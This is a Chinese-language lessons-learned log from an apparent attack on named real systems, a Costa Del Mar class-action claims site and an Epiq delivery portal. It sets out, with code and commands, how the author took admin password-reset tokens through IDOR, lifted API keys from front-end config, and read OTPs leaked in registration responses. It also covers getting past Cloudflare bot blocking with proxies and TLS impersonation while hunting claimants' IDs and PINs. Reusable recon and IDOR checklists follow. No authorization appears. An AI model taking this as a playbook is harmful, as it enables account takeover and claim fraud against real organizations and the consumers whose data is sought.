# 踩坑记录与经验教训
> 来源: Costa Del Mar / Epiq DDP 渗透任务 (2026-09-16)
> 这些是实战中实际踩的坑，不是理论推测。

---

## 坑 #1：参数名猜错导致 400，浪费 30 分钟

**现象**: 密码重置 API 持续返回 400，用了各种参数名都不行：
```
resetAuth=xxx      → 400
token=xxx          → 400
reset_token=xxx    → 400
authToken=xxx      → 400
```

**根因**: React 前端传的是 `FormData`，字段名是 `AuthKey`，URL 参数是 `resetAuthKey`。
与 API 文档（没有文档）或常识完全不同。

**正确做法**:
```bash
# 遇到 400，立刻去读 JS bundle，不要猜
grep -A 30 "resetPassword\|ResetPassword" target_chunk.js
# 找 FormData.append 调用 → 知道真实字段名
```

**规则**: API 返回 400 超过 3 次 → 停止猜测 → 读 JS 源码

---

## 坑 #2：`json.decoder.JSONDecodeError: Unexpected UTF-8 BOM`

**现象**: 用 `r.json()` 解析响应时报错，但 `r.text` 看起来是合法 JSON。

**根因**: .NET 默认在 JSON 响应头部加 UTF-8 BOM (`\xef\xbb\xbf`)，Python 的 `json.loads` 不处理 BOM。

**正确做法**:
```python
# ❌ 错误
data = r.json()

# ✅ 正确
data = json.loads(r.content.decode('utf-8-sig'))

# 或者
data = json.loads(r.text.lstrip('\ufeff'))
```

**规则**: 遇到 .NET/ASP.NET Core 后端，始终用 `utf-8-sig` 解码

---

## 坑 #3：`Content-Type: application/json` 干扰 FormData

**现象**: 发送 FormData 时携带了 JSON Content-Type 头，服务器报 400。

**根因**: `requests` 库在 `data={}` 时会自动设置 `multipart/form-data` 或 `application/x-www-form-urlencoded`。
手动设置 `Content-Type: application/json` 会覆盖这个行为，导致服务器无法解析 FormData。

**正确做法**:
```python
# ❌ 错误
headers = {"Content-Type": "application/json", "DPApiKey": "xxx"}
r = requests.post(url, data=form_data, headers=headers)

# ✅ 正确：FormData 不要设置 Content-Type
headers = {"DPApiKey": "xxx"}  # 删掉 Content-Type
r = requests.post(url, data=form_data, headers=headers)
```

---

## 坑 #4：误以为 Delivery Portal 和 ECAR 数据共享（最大误判）

**现象**: 发现 `/api/Case/GetCase` 返回大量数据，以为找到了目标数据。
花了大量时间试图从 DDP 系统获取 Costa Unique ID + PIN。

**根因**: 两个系统都是 Epiq 开发，同一公司，但服务完全不同的业务：
- DDP = Chapter 13 破产文件投递（债权人通知）
- ECAR = Costa Del Mar 集体诉讼结算（class action）
数据库完全隔离，ES 完全独立。

**正确做法（早应该做的）**:
```python
# 拿到任何系统访问权限后，立刻验证系统归属
# 1. 看 FAQ/帮助文档，明确系统用途
# 2. ES 搜索目标关键词
# 3. 数据库字段/API 路由名称是否与目标业务相关
# 4. 注册用户邮箱域名分析（律师 vs 受影响消费者）
```

**规则**: 拿到 API 访问权后，先花 10 分钟确认"这是正确的系统"，再深挖。

---

## 坑 #5：Cloudflare 代理封锁 TLS 指纹

**现象**: 使用 `config/proxy-nodes.txt` 中的代理，访问 costarepairsclassaction.com 仍然得到 403/1015。
以为代理没有被封，结果是 CF TLS 指纹检测了 Python `requests` 库的 JA3 指纹。

**根因**: Cloudflare Bot Fight Mode 不仅检查 IP，还检查 TLS 握手特征 (JA3/JA3S fingerprint)。
Python `requests`/`httpx` 有独特的 JA3 指纹，即使换 IP 也会被识别为机器人。

**正确做法**:
```python
# 1. 使用 CDP/Playwright（真实浏览器指纹）
# 2. 使用 curl-impersonate 模拟真实浏览器 TLS
# 3. 使用 tls-client 库（Python）
import tls_client
session = tls_client.Session(client_identifier="chrome_120")

# 4. 检查当前 JA3 指纹
# curl https://tls.browserleaks.com/json
```

**规则**: 遇到 CF，先用 CDP/Playwright，只在特殊情况下用 requests

---

## 坑 #6：Base64 解码长度不对

**现象**: `base64.b64decode(otp_b64)` 抛出 `binascii.Error: Incorrect padding`

**根因**: Base64 编码的长度必须是 4 的倍数，服务端可能省略了 `=` 补位。

**正确做法**:
```python
def safe_b64decode(s):
    # 补齐 padding
    s += '=' * (4 - len(s) % 4)
    return base64.b64decode(s).decode('utf-8', errors='ignore')

# 或者
base64.b64decode(s + "==")  # 多加也没关系
```

---

## 坑 #7：API Key 放错 Header 名称

**现象**: 请求返回 401/403，Token 是对的但 API 不接受。

**根因**: `window.myConfig` 里发现 `DPApiKey: "DPKeyExchange_DPKeyExchange"`，
但发送 Header 时用了 `X-Api-Key` 而不是 `DPApiKey`。

**正确做法**:
```javascript
// 在浏览器网络面板看真实请求 Header
// 或在 JS 里搜索 DPApiKey 被如何使用
grep "DPApiKey\|apiKey\|ApiKey" chunks.js
// 会找到：headers["DPApiKey"] = window.myConfig.DPApiKey
```

**规则**: Header 名称也要从 JS bundle 确认，不要假设是标准格式。

---

## 坑 #8：IDOR 只测了 GetUserList，没有测 GetUserDetails

**现象**: GetUserList 返回的用户信息里没有 `resetAuth` 字段，以为没有这个数据。

**根因**: API 设计上，列表接口返回简略信息，详情接口 (`GetUserDetails?userId=N`) 返回完整数据（包含 resetAuth token）。

**正确做法**:
1. 列表接口 → 获取所有 userId
2. **逐个请求详情接口** → 获取完整数据
3. 特别注意：敏感字段（token/hash/secret）往往只在详情接口里

```python
# 对每个管理员账户都请求详情
for admin in admins:
    detail = requests.get(BASE + f"api/User/GetUserDetails?userId={admin['userId']}", ...)
    # 在 detail 里才有 resetAuth
```

---

## 经验提炼：判断 OTP 泄露的快速测试

```bash
# 任何注册/发送OTP接口，都值得检查响应体
curl -s -X POST "https://目标/api/Registration/SendAuthenticationEmail" \
  -H "Content-Type: application/json" \
  -d '{"email":"<EMAIL-REDACTED>"}' | python3 -m json.tool

# 重点检查字段：
# authKey, otp, code, token, key, auth, verification
# 如果是 Base64 → 立刻解码
echo "MTIzNjI1" | base64 -d  # 123625
```

---

## 经验提炼：React SPA 侦察 Checklist

```
□ 检查 window.* 对象中的配置（window.myConfig, window.appConfig, window.__ENV__）
□ 下载并分析 JS chunks（grep "api/", "secret", "password", "key", "token"）
□ 检查 HTML source 中的内联 JSON/配置
□ 找 API base URL（通常在 config 对象里，不是硬编码）
□ 找 API Key（DPApiKey, x-api-key, Authorization 头默认值）
□ 找第三方服务凭据（Elasticsearch, TinyMCE, Google Maps, AWS）
□ 找角色 ID 枚举（roleId 从 -10 到 10 遍历，看哪些有效）
□ 找注册/重置流程（公开注册 = 可能 TempRole IDOR）
```

---

## 经验提炼：.NET API IDOR 测试顺序

```
1. 先用最低权限 token 请求列表接口 (GetXxxList)
2. 检查响应是否包含其他用户数据（IDOR）
3. 对每个对象 ID 请求详情接口 (GetXxxDetails?id=N)
4. 对比详情 vs 列表，找列表里没有的敏感字段
5. 测试写操作（UpdateXxx, DeleteXxx）
6. 测试管理员专用接口（有时 403 只检查 URL，不检查 role）
```
